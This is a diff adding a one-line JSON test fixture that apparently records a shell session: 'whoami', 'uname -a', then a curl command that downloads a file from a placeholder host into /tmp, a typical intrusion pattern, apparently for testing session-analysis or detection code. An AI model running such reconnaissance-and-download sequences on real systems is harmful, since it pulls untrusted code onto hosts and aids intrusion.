@@ -1,0 +1,1 @@
+{"session_id":"fixture-1","commands":[{"cmd":"whoami","dt":0},{"cmd":"uname -a","dt":2.1},{"cmd":"curl -o /tmp/a https://example.invalid/a","dt":0.4}]}
